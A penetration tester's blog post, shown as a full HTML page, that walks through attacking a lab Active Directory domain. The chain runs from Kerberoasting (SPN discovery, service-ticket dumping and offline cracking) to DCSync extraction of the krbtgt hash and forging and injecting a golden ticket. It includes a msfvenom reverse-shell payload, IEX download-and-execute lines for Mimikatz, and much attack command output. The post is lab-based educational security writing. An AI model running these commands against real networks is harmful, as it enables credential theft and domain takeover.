<!doctype html><html lang=en dir=auto>
<head><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=robots content="index, follow">
<title>kerberos, kerberoast and golden tickets | #!/bin/note
</title>
<meta name=keywords content="kerberos,golden ticket,kerberoast,rc4">
<meta name=description content="
     


Active Directory is almost always in scope for many pentests. There is sometimes a competitive nature amongst pentesters where the challenge is to see who can set a new record for gaining Domain Administrative privileges the fastest. How sad its that?
The reality is, many times, the escalation processes is trivial. Pwn some workstation with admin creds, grab credentials out of lsass and pass the hash to move around laterally. This has been the typical breakfast of many pentesters. Heck, there are even attempts to automate this type of process because, personally, I feel its getting pretty old. Yet, its still very viable as an attack method due to its high success rate!
This post however tries to look at it from a little fresher perspective. There are many posts like this out there, but this one is mine. Mostly just a brain dump that I can refer to later. Many others have written this up (maybe even in greater detail), so definitely have a look around!">
<meta name=author content="Leon Jacobs">
<link rel=canonical href=https://leonjza.github.io/blog/2016/01/09/kerberos-kerberoast-and-golden-tickets/>
<link crossorigin=anonymous href=/assets/css/stylesheet.min.5e2b4101351c21e906f398ae96901791830f58d430f96f2659dab7eaef7b3cb7.css integrity="sha256-XitBATUcIekG85iulpAXkYMPWNQw+W8mWdq36u97PLc=" rel="preload stylesheet" as=style>
<script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://leonjza.github.io/favicon.ico>
<link rel=icon type=image/png sizes=16x16 href=https://leonjza.github.io/favicon-16x16.png>
<link rel=icon type=image/png sizes=32x32 href=https://leonjza.github.io/favicon-32x32.png>
<link rel=apple-touch-icon href=https://leonjza.github.io/apple-touch-icon.png>
<link rel=mask-icon href=https://leonjza.github.io/safari-pinned-tab.svg>
<meta name=theme-color content="#2e2e33">
<meta name=msapplication-TileColor content="#2e2e33">
<meta name=generator content="Hugo 0.88.1">
<noscript>
<style>#theme-toggle,.top-link{display:none}</style>
<style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style>
</noscript>
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-44457032-2','auto'),ga('send','pageview'))</script><meta property="og:title" content="kerberos, kerberoast and golden tickets">
<meta property="og:description" content="
     


Active Directory is almost always in scope for many pentests. There is sometimes a competitive nature amongst pentesters where the challenge is to see who can set a new record for gaining Domain Administrative privileges the fastest. How sad its that?
The reality is, many times, the escalation processes is trivial. Pwn some workstation with admin creds, grab credentials out of lsass and pass the hash to move around laterally. This has been the typical breakfast of many pentesters. Heck, there are even attempts to automate this type of process because, personally, I feel its getting pretty old. Yet, its still very viable as an attack method due to its high success rate!
This post however tries to look at it from a little fresher perspective. There are many posts like this out there, but this one is mine. Mostly just a brain dump that I can refer to later. Many others have written this up (maybe even in greater detail), so definitely have a look around!">
<meta property="og:type" content="article">
<meta property="og:url" content="https://leonjza.github.io/blog/2016/01/09/kerberos-kerberoast-and-golden-tickets/"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2016-01-09T10:12:09+02:00">
<meta property="article:modified_time" content="2016-01-09T10:12:09+02:00"><meta property="og:site_name" content="#!/bin/note
">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="kerberos, kerberoast and golden tickets">
<meta name=twitter:description content="
     


Active Directory is almost always in scope for many pentests. There is sometimes a competitive nature amongst pentesters where the challenge is to see who can set a new record for gaining Domain Administrative privileges the fastest. How sad its that?
The reality is, many times, the escalation processes is trivial. Pwn some workstation with admin creds, grab credentials out of lsass and pass the hash to move around laterally. This has been the typical breakfast of many pentesters. Heck, there are even attempts to automate this type of process because, personally, I feel its getting pretty old. Yet, its still very viable as an attack method due to its high success rate!
This post however tries to look at it from a little fresher perspective. There are many posts like this out there, but this one is mine. Mostly just a brain dump that I can refer to later. Many others have written this up (maybe even in greater detail), so definitely have a look around!">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://leonjza.github.io/posts/"},{"@type":"ListItem","position":3,"name":"kerberos, kerberoast and golden tickets","item":"https://leonjza.github.io/blog/2016/01/09/kerberos-kerberoast-and-golden-tickets/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"kerberos, kerberoast and golden tickets","name":"kerberos, kerberoast and golden tickets","description":"  Active Directory is almost always in scope for many pentests. There is sometimes a competitive nature amongst pentesters where the challenge is to see who can set a new record for gaining Domain Administrative privileges the fastest. How sad its that?\nThe reality is, many times, the escalation processes is trivial. Pwn some workstation with admin creds, grab credentials out of lsass and pass the hash to move around laterally. This has been the typical breakfast of many pentesters. Heck, there are even attempts to automate this type of process because, personally, I feel its getting pretty old. Yet, its still very viable as an attack method due to its high success rate!\nThis post however tries to look at it from a little fresher perspective. There are many posts like this out there, but this one is mine. Mostly just a brain dump that I can refer to later. Many others have written this up (maybe even in greater detail), so definitely have a look around!\n","keywords":["kerberos","golden ticket","kerberoast","rc4"],"articleBody":"  Active Directory is almost always in scope for many pentests. There is sometimes a competitive nature amongst pentesters where the challenge is to see who can set a new record for gaining Domain Administrative privileges the fastest. How sad its that?\nThe reality is, many times, the escalation processes is trivial. Pwn some workstation with admin creds, grab credentials out of lsass and pass the hash to move around laterally. This has been the typical breakfast of many pentesters. Heck, there are even attempts to automate this type of process because, personally, I feel its getting pretty old. Yet, its still very viable as an attack method due to its high success rate!\nThis post however tries to look at it from a little fresher perspective. There are many posts like this out there, but this one is mine. Mostly just a brain dump that I can refer to later. Many others have written this up (maybe even in greater detail), so definitely have a look around!\nlets set the scene Kerberos, a network authentication protocol that works off a ticketing type system is deeply baked into Active Directory. Of late, a lot more focus has been put on it by the offensive security community as you will see later in this post. I am not going to go into much (if any) of the technicalities of Kerberos itself as I feel there really is more than enough resources out there you can refer to! The below list references some great posts about the same topic I am writing about there:\n https://en.wikipedia.org/wiki/Kerberos_(protocol) https://technet.microsoft.com/en-us/library/cc772815(v=ws.10).aspx http://dfir-blog.com/2015/12/13/protecting-windows-networks-kerberos-attacks/ https://adsecurity.org/?p=2362  For all of the attacks detailed here, I have a relatively simple setup in a lab. One (Server 2012) Domain Controller for the foo.local domain. Two client PCs joined to the domain running Windows 7 and Windows 10. Another IIS Web server running on Server 2012 Core also joined to the domain and Kali Linux ‘attacker’ on the same subnet as all of these Windows computers.\nOne key piece of the puzzle I am leaving out is how the initial shell was obtained. This could have happened a variety of ways and will probably always be different with every engagement. Lets just assume that I have a meterpreter shell as a non privileged domain user on the Windows 10 client PC.\n  One last bit of scene setting I think is important is to state the fact that we are going to try and be as quiet as possible now that we have the meterpreter shell up.\nspn scanning - the setup One of the avenues we can pursue now is to query Active Directory for objects that have a Service Principal Name set.\n A service principal name (SPN) is the name by which a client uniquely identifies an instance of a service. If you install multiple instances of a service on computers throughout a forest, each instance must have its own SPN.\n Basically, what this means is that someone went and configured a SPN for a service account that is used by multiple by instances of a service. Each of the client PC’s in my lab are running an instance of SQL Server 2014 Express, configured to run with the svcSQLServ domain service account.\n When a client wants to connect to a service, it locates an instance of the service, composes an SPN for that instance, connects to the service, and presents the SPN for the service to authenticate.\n On my domain controller, I configured the SPN’s with the following commands:\nPS C:\\ setspn -A svcSQLServ/pc1.foo.local:1433 foo\\svcSQLServ Checking domain DC=foo,DC=local Registering ServicePrincipalNames for CN=SQL Server,OU=Service Accounts,DC=foo,DC=local svcSQLServ/pc1.foo.local:1433 Updated object PS C:\\ setspn -A svcSQLServ/pc2.foo.local:1433 foo\\svcSQLServ Checking domain DC=foo,DC=local Registering ServicePrincipalNames for CN=SQL Server,OU=Service Accounts,DC=foo,DC=local svcSQLServ/pc2.foo.local:1433 Updated object spn scanning - the offensive perspective Right, with the configuration done, lets put on our offensive hats and try and abuse this. I think one thing that one should realize is that this is a very nice way to get a free port scan done too. You will see in a moment. =]\nReading some posts and stuff online, I have found a PowerShell module that will prep the LDAP lookup and scan for SPNs for you here. The gist of it is this LDAP search (\u0026(objectcategory=user)(serviceprincipalname=*)).\nTo use the powershell module, the easiest will be to get an interactive powershell session up and running. If you have ever tried this from meterpreter, you will know that if you try and spawn powershell.exe from a cmd shell, you will not get anywhere. Very frustrating. Its not impossible though! We are however going to go through the efforts of getting a working PowerShell session up as we will be using it extensively throughout this post.\nsetup a powershell connection We can use the meterpreter session to get a powershell session. First, we will create a payload to execute as a script using the exec_powershell post module. In a new terminal, run msfvenom -p windows/powershell_reverse_tcp LHOST=192.168.138.150 LPORT=4445 -t raw:\nroot@kali:~# msfvenom -p windows/powershell_reverse_tcp LHOST=192.168.138.150 LPORT=4445 -t raw No platform was selected, choosing Msf::Module::Platform::Windows from the payload No Arch selected, selecting Arch: x86 from the payload No encoder or badchars specified, outputting raw payload Payload size: 1727 bytes ���`��1�d�P0�R \u0001�8�u�\u0003}�;}$u�X�X$\u0001�f�Y \u0001ӋI\u0018�:I�4�\u0001�1���� K�X\u001c\u0001Ӌ\u0004�\u0001ЉD$$[[aYZQ��__Z�\u0012��]j\u0001���Ph1�o��ջ���Vh������$($s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIABX0kF ... snip ... AAA='));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();) This will give you the raw payload you need to run to get a remote powershell shell. Copy the output from IEX all the way to ReadToEnd();) and paste that in a new file (I used /root/power-shell.ps1).\nNow, back at your metasploit session, background the meterpreter session and setup a new exploit/multi/handler for the windows/powershell_reverse_tcp payload. When you issue the exploit command, add -j so that the job will run in the background as we have one more thing to do before it will connect back.\n  Fantastic. We are ready to accept the powershell connection! The last thing left to do is to execute the script we generated earlier with msfvenom! Use the exec_powershell post module and configure it to pickup the script where ever you placed it on disk:\n  With the module configured to use the meterpreter session we originally got, as well as our exploit handler waiting in the background for the powershell connection, we issue the run command and hope it works!\n   Powershell session session 3 opened\n Ok, that was a lot of work, but now we have the environment we need to get on with the SPN scanning! Simply interact with the session that spawned.\nThe next thing we want to do is get the Find-PSServiceAccounts PowerShell function into the environment. The script lives here. Thankfully, we can kind of include functions into the current session by using the powershell Invoke-Expression cmdlet for a new Net.WebClient object. To do that we run:\nInvoke-Expression (New-Object Net.Webclient).downloadstring('https://raw.githubusercontent.com/PyroTek3/PowerShell-AD-Recon/master/Find-PSServiceAccounts') Thats it. We can now just run the method!!\n  We have just discovered the service account svcSQLServ and 2 hosts there it is in use! The script also accepts a few arguments, such as -DumpSPN:\nPS C:\\ Find-PSServiceAccounts -DumpSPN Discovering service account SPNs in the AD Domain foo.local svcSQLServ/pc1.foo.local:1433 svcSQLServ/pc2.foo.local:1433 PS C:\\Users\\bobs\\Downloads This is the part where I remind you about the free port scan I mentioned earlier. Notice how we have discovered services, ports and accounts running them using just a LDAP query. I highly doubt that will trigger many monitoring tools out there!\nkerberos service tickets We now have 2 SPN’s that we managed to query off the domain. svcSQLServ/pc1.foo.local:1433 \u0026 svcSQLServ/pc2.foo.local:1433. In order for clients to be able to authenticate to the services running as this user via kerberos, they would typically go through the process of requesting a service ticket.\nThis is where you need to pay attention. The service ticket is encrypted using the secret key (read, ‘password’) of the account used in the SPN (svcSQLServ in this case)! The server never checks if the ticket ever went through the entire process of actually being used, it just happily generates them for whoever asks… Note, the server hosting the service will still validate the ticket itself (99% of the time without rechecking the ticket with the Kerberos server).\nWhat does that mean for an attacker? Well, we can request the service ticket… and… attempt to decrypt it by brute forcing it offline! If the decryption is successful, then we have successfully compromised a service account.\nenter kerberoast Kerberoast is a tool that can amongst other things, crack Kerberos ticket passwords. The general idea is that we get the SPN’s (like we did), request kerberos service tickets for them, dump the ticket out of memory and send it to the tgsrepcrack.py script to crack against a wordlist.\nAll of this can be done as a normal domain user and does not require any elevated privileges. To assist us in dumping kerberos tickets out of memory, we are going to load mimikatz by using Invoke-Mimikatz (from the PowerSploit Repository). This method has a very small to no chance of getting detected by AV atm. Lets get that loaded:\nPS C:\\ Invoke-Expression (New-Object Net.Webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1') PS C:\\ Invoke-Mimikatz .#####. mimikatz 2.0 alpha (x64) release \"Kiwi en C\" (Dec 14 2015 19:16:34) .## ^ ##. ## / \\ ## /* * * ## \\ / ## Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) '## v ##' http://blog.gentilkiwi.com/mimikatz (oe.eo) '#####' with 17 modules * * */ mimikatz(powershell) # sekurlsa::logonpasswords ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005) mimikatz(powershell) # exit Bye! Just running Invoke-Mimikatz might not be entirely opsec safe as, by default, it will run the sekurlsa::logonpasswords command (which may trigger some monitoring). You may have also noticed the LOAD_MODULES setting in the windows/powershell_reverse_tcp payload. Here we can actually give it the URL’s we are going to load with Invoke-Expression and metasploit will download and prep that for you! :)\nAnyways, lets check the current cached kerberos tickets that we have for this session.\nPS C:\\ Invoke-Mimikatz -Command '\"kerberos::list\"' .#####. mimikatz 2.0 alpha (x64) release \"Kiwi en C\" (Dec 14 2015 19:16:34) .## ^ ##. ## / \\ ## /* * * ## \\ / ## Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) '## v ##' http://blog.gentilkiwi.com/mimikatz (oe.eo) '#####' with 17 modules * * */ mimikatz(powershell) # kerberos::list PS C:\\ Looks like there are no cached Kerberos tickets for this session. This can also be checked by running the klist command:\nPS C:\\ klist Current LogonId is 0:0x3fde2 Cached Tickets: (0) PS C:\\ If you had tickets here, you can purge them from memory by running Invoke-Mimikatz -Command '\"kerberos::purge\"'. Lets request a service ticket for the svcSQLServ/pc1.foo.local:1433 SPN (The command syntax can be seen in the Kerberoast repository):\nPS C:\\ Add-Type -AssemblyName System.IdentityModel PS C:\\ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"svcSQLServ/pc1.foo.local:1433\" Id : uuid-33208c1c-6f30-441f-af50-94ba72a2ed7b-1 SecurityKeys : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey} ValidFrom : 1/9/2016 7:29:11 PM ValidTo : 1/10/2016 5:29:11 AM ServicePrincipalName : svcSQLServ/pc1.foo.local:1433 SecurityKey : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey PS C:\\ If you wanted to get tickets for all of the possible SPN’s, we could have run the below command that will loop over the results from Find-PSServiceAccounts and request a ticket for each:\nPS C:\\ Add-Type -AssemblyName System.IdentityModel PS C:\\ Find-PSServiceAccounts -DumpSPNs | ForEach-Object { New-Object System.Identity Model.Tokens.KerberosRequestorSecurityToken -ArgumentList $_ } Now, if we recheck the tickets we have for this session, we can see that we have one for svcSQLServ:\n  dumping kerberos tickets from memory Remember, all of the actions performed thus far have been as a normal AD user with no special privileges. With the tickets now in memory, we can dump them to a file using mimikatz again. The mimikatz command we will use for this is kerberos::list /export:\n  1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi is the Kerberos ticket dumped to disk! We can now transfer this to some place where we have Kerberoast downloaded and start cracking it! :D\ncracking the kerberos ticket Back at my meterpreter session, we can simply download the ticket locally, and start the crack. tgsrepcrack.py allows you to specify tickets with a wildcard, so it will run the wordlist recursively over all of the tickets in a directory.\nSo download the ticket…\nmeterpreter  cd downloads/kerb meterpreter  ls Listing: C:\\users\\bobs\\downloads\\kerb ===================================== Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 100666/rw-rw-rw- 1260 fil 2016-01-09 14:35:09 -0500 0-40e10000-bobs@krbtgt~FOO.LOCAL-FOO.LOCAL.kirbi 100666/rw-rw-rw- 1364 fil 2016-01-09 14:35:09 -0500 1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi meterpreter  download 1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi /root/ [*] downloading: 1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi - /root//1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi [*] download : 1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi - /root//1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi … and crack it!\nroot@kali:~/kerberoast# python tgsrepcrack.py /usr/share/wordlists/fasttrack.txt /root/1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi found password for ticket 0: Password1 File: /root/1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi All tickets cracked! Password1 is the password for the svcSQLServ account! \\o/\nOne reason why having the password for this account is especially bad is because of its group memberships… Yes, I know. You may not easily see this in real life, but just bear with me for now.\nPS C:\\ net user svcSQLServ /domain The request will be processed at a domain controller for domain foo.local. User name svcSQLServ Full Name SQL Server Comment SQL Server Serice Account User's comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 1/7/2016 11:38:02 PM Password expires Never Password changeable 1/8/2016 11:38:02 PM Password required Yes User may change password Yes Workstations allowed All Logon script User profile Home directory Last logon 1/9/2016 10:33:41 AM Logon hours allowed All Local Group Memberships Global Group memberships *Domain Users *Domain Admins The command completed successfully. PS C:\\ testing the credentials For a bit of fun, lets test the credentials we just got using PowerShell Remoting. PowerShell Remoting is on by default on Server 2012 I believe.\nWe will start by configuring a credentials object, and then just run the Get-Process cmdlet on the domain controller as proof.\n$pass = 'Password1' | ConvertTo-SecureString -AsPlainText -Force $creds = New-Object System.Management.Automation.PSCredential -ArgumentList 'svcSQLServ', $pass Invoke-Command -ScriptBlock {get-process} -ComputerName dc1 -Credential $creds With output…\n  So, we popped a service account with waaaay too much permissions and a crappy password. All that as a normal AD user…\ngolden tickets We have domain administrative rights now. There is nothing left to do, we can write the pentest report and go home. Or can we? Well yes, but what if the password to svcSQLServ changes? That would mean we lose access! One way we can prevent this is by creating a golden ticket that we can re-use to grant ourselves whatever permission we like, as any user we like! Sounds great eh :D\nTo create a golden ticket, we can use either the kiwi extension in metasploit, or Invoke-Mimikatz again! There are however a few prerequisites that we need to satisfy for golden tickets. The most important being that we need at least the NT hash of the krbtgt user of the domain. Without that, this is not a viable persistence strategy.\nThe complete list of prerequisites are:\n The Domains FQDN The Domains SID The krbtgt accounts NT hash A username (fake or real, does not matter. Not fake if you need opsec ofc!)  Getting the FQDN and SID (whoami /user) of the Domain should be relatively trivial. Remember to grab the SID without the trailing RID. So if the full SID is S-1-5-21-2222611480-1876485831-1594900117-1104 then you are only going to use S-1-5-21-2222611480-1876485831-1594900117.\nGetting the NT Hash of the krbtgt account though is something I want to show using a recent feature addition to mimikatz, DCSync. The gist of it is that its possible to extract hashes from a Domain Controller (using a domain admin type account), without actually running any code on the Domain Controller itself! This is of course not the only way to get the required hash. Many of the older techniques work just fine. But, from a DCSync perspective, it essentially means hash extraction from any PC on the domain (authenticated as a admin), by ‘faking’ being a Domain Controller and triggering some replication-fu! In my case, I struggled a little to get this replication done from a client PC in the lab via the metasploit interactive PowerShell session, but could do it successfully from a client PC via the console. So, its definitely possible!\nIn this case, to use the DCSync feature of mimikatz, I am going to use PowerShell Remoting to run commands. Unfortunately, due to the way Enter-PSSession sets up the shell, I can’t seem to get an interactive shell as another user going without using another exploit \u0026\u0026 payload combination. So, we are just going to use Invoke-Command with our commands.\nPS C:\\ $creds UserName Password -------- -------- svcSQLServ System.Security.SecureString PS C:\\ Invoke-Command -ScriptBlock {Write-Output $env:username} -Credential $creds -ComputerName dc1 svcSQLServ Great so that works. To continue, we are going to have to run a few commands:\n Invoke-Expression to get mimikatz Run Invoke-Mimikatz with lsadump::dcsync /user:krbtgt and its required parameters Dance!  I constructed my command that needed to be run on my PowerShell session and ended up with this:\nInvoke-Command -ScriptBlock {Invoke-Expression (New-Object Net.Webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command '\"lsadump::dcsync /user:krbtgt\"'} -Credential $creds -ComputerName dc1 Let me try explain what is going on here. I am saying, Invoke-Command on the computer dc1 as svcSQLServ (stored in the $creds variable) using PowerShell Remoting. The command to run is defined in the ScriptBlock {} which is i) download mimikatz ii) run Invoke-Mimikatz with the lsadump::dcsync /user:krbtgt command.\n  We have the hash for krbtgt! 95a11f7d93fa3a5a61073662e6bd8468 : D That means I have everything I need to create a golden ticket, with all the access in the world! To summarize, my prerequisites are satisfied with the following values:\n The Domains FQDN. foo.local The Domains SID. S-1-5-21-2222611480-1876485831-1594900117 The krbtgt accounts NT hash. 95a11f7d93fa3a5a61073662e6bd8468 A username (fake or real, does not matter. Not fake if you need opsec ofc!). darthvader  creating the golden ticket Creating the golden ticket is now a really simple task. We will simply call Invoke-Mimikatz again to generate the ticket. It will be saved to disk when it is generated. Thereafter, we will purge all the tickets we have for the session, and inject the golden ticket and test our access!\nFor details about the command and arguments required, I referred to the mimikatz wiki and replicated that. Our command should look something like the below, saving our golden ticket to golden.tck with access to a few builtin Windows Groups:\nkerberos::golden /user:darthvader /domain:foo.local /sid:S-1-5-21-2222611480-1876485831-1594900117 /krbtgt:95a11f7d93fa3a5a61073662e6bd8468 /ticket:golden.tck /groups:501,502,513,512,520,518,519 Running this mimikatz command with Invoke-Mimikatz gets us our Golden Ticket:\n  injecting the golden ticket The final test is to use this ticket. For that, we will purge all Kerberos tickets in memory and inject the new golden ticket. Thereafter we will test if we can read the administrative c$ share of the Domain Controller!\nLets purge the currently cached Kerberos tickets first:\nPS C:\\users\\bobs\\downloads\\golden Invoke-Mimikatz -Command '\"kerberos::purge\"' [... snip ...] mimikatz(powershell) # kerberos::purge Ticket(s) purge for current session is OK Next, we inject the golden ticket we created using the mimikatz kerberos::ptt command to ‘Pass The Ticket’:\n  After the ticket is injected into memory, we can verify its existence with the mimikaz kerberos::list command, or just using klist. Once it is injected, we dir the Domain Controllers c$ share… an smile. The password for scvSQLServ can now change, it will no longer bother us!\n  conclusion In this post we saw how it is possible to ‘crack’ badly passworded and configured service accounts by querying for accounts by Service Principal Names. Those SPN’s were then used to request Service Tickets from the Domain Controller, extracted from memory and cracked offline. All of that as a normal domain user.\nThen, we explored how it is possible to extract Domain Account hashes using the mimikatz DCSync feature and generate a Kerberos Golden Ticket with high access levels in the domain.\nI think there is still a loooong road ahead for the Microsoft Kerberos Implementations… Until they ‘fix’ this stuff, things should remain interesting for quite some time to come.\n","wordCount":"3279","inLanguage":"en","datePublished":"2016-01-09T10:12:09+02:00","dateModified":"2016-01-09T10:12:09+02:00","author":{"@type":"Person","name":"Leon Jacobs"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://leonjza.github.io/blog/2016/01/09/kerberos-kerberoast-and-golden-tickets/"},"publisher":{"@type":"Organization","name":"#!/bin/note\n","logo":{"@type":"ImageObject","url":"https://leonjza.github.io/favicon.ico"}}}</script>
</head>
<body id=top>
<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
<header class=header>
<nav class=nav>
<div class=logo>
<a href=https://leonjza.github.io accesskey=h title="#!/bin/note
 (Alt + H)">#!/bin/note
</a>
<span class=logo-switches>
<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</button>
</span>
</div>
<ul id=menu>
<li>
<a href=https://leonjza.github.io/about/ title="About Me">
<span>About Me</span>
</a>
</li>
<li>
<a href=https://leonjza.github.io/archives title=Archive>
<span>Archive</span>
</a>
</li>
<li>
<a href=https://leonjza.github.io/categories title=Categories>
<span>Categories</span>
</a>
</li>
<li>
<a href=https://leonjza.github.io/search/ title="Search (Alt + /)" accesskey=/>
<span>Search</span>
</a>
</li>
</ul>
</nav>
</header>
<main class=main>
<article class=post-single>
<header class=post-header>
<div class=breadcrumbs><a href=https://leonjza.github.io>Home</a>&nbsp;»&nbsp;<a href=https://leonjza.github.io/posts/>Posts</a></div>
<h1 class=post-title>
kerberos, kerberoast and golden tickets
</h1>
<div class=post-meta>January 9, 2016&nbsp;·&nbsp;16 min&nbsp;·&nbsp;Leon Jacobs&nbsp;|&nbsp;<a href=https://github.com/leonjza/leonjza.github.io/tree/source/content/posts/2016-01-09-kerberos-kerberoast-and-golden-tickets.markdown rel="noopener noreferrer" target=_blank>Suggest Changes</a>
</div>
</header> <div class=toc>
<details>
<summary accesskey=c title="(Alt + C)">
<span class=details>Table of Contents</span>
</summary>
<div class=inner><ul><ul>
<li>
<a href=#lets-set-the-scene aria-label="lets set the scene">lets set the scene</a></li></ul>
<li>
<a href=#spn-scanning---the-setup aria-label="spn scanning - the setup">spn scanning - the setup</a><ul>
<li>
<a href=#spn-scanning---the-offensive-perspective aria-label="spn scanning - the offensive perspective">spn scanning - the offensive perspective</a><ul>
<li>
<a href=#setup-a-powershell-connection aria-label="setup a powershell connection">setup a powershell connection</a></li></ul>
</li>
<li>
<a href=#kerberos-service-tickets aria-label="kerberos service tickets">kerberos service tickets</a></li>
<li>
<a href=#enter-kerberoast aria-label="enter kerberoast">enter kerberoast</a></li>
<li>
<a href=#dumping-kerberos-tickets-from-memory aria-label="dumping kerberos tickets from memory">dumping kerberos tickets from memory</a></li>
<li>
<a href=#cracking-the-kerberos-ticket aria-label="cracking the kerberos ticket">cracking the kerberos ticket</a></li>
<li>
<a href=#testing-the-credentials aria-label="testing the credentials">testing the credentials</a></li></ul>
</li>
<li>
<a href=#golden-tickets aria-label="golden tickets">golden tickets</a><ul>
<li>
<a href=#creating-the-golden-ticket aria-label="creating the golden ticket">creating the golden ticket</a></li>
<li>
<a href=#injecting-the-golden-ticket aria-label="injecting the golden ticket">injecting the golden ticket</a></li>
<li>
<a href=#conclusion aria-label=conclusion>conclusion</a>
</li>
</ul>
</li>
</ul>
</div>
</details>
</div>
<div class=post-content><figure>
<img loading=lazy src=/images/kerberos_golden_ticket_active_directory_logo.png>
</figure>
<p>Active Directory is almost always in scope for many pentests. There is sometimes a competitive nature amongst pentesters where the challenge is to see who can set a new record for gaining Domain Administrative privileges the fastest. How sad its that?</p>
<p>The reality is, <em>many</em> times, the escalation processes is trivial. Pwn some workstation with admin creds, grab credentials out of <code>lsass</code> and pass the hash to move around laterally. This has been the typical breakfast of many pentesters. Heck, there are even attempts to <a href=https://github.com/sensepost/autoDANE>automate</a> this type of process because, personally, I feel its getting pretty old. Yet, its still very viable as an attack method due to its high success rate!</p>
<p>This post however tries to look at it from a little fresher perspective. There are many posts like this out there, but this one is mine. Mostly just a brain dump that I can refer to later. Many others have written this up (maybe even in greater detail), so definitely have a look around!</p>
<h2 id=lets-set-the-scene>lets set the scene<a hidden class=anchor aria-hidden=true href=#lets-set-the-scene>#</a></h2>
<p>Kerberos, a network authentication protocol that works off a ticketing type system is deeply baked into Active Directory. Of late, a lot more focus has been put on it by the offensive security community as you will see later in this post. I am not going to go into much (if any) of the technicalities of Kerberos itself as I feel there really is more than enough resources out there you can refer to! The below list references some great posts about the same topic I am writing about there:</p>
<ul>
<li><a href=https://en.wikipedia.org/wiki/Kerberos_%28protocol%29>https://en.wikipedia.org/wiki/Kerberos_(protocol)</a></li>
<li><a href=https://technet.microsoft.com/en-us/library/cc772815%28v%3Dws.10%29.aspx>https://technet.microsoft.com/en-us/library/cc772815(v=ws.10).aspx</a></li>
<li><a href=http://dfir-blog.com/2015/12/13/protecting-windows-networks-kerberos-attacks/>http://dfir-blog.com/2015/12/13/protecting-windows-networks-kerberos-attacks/</a></li>
<li><a href="https://adsecurity.org/?p=2362">https://adsecurity.org/?p=2362</a></li>
</ul>
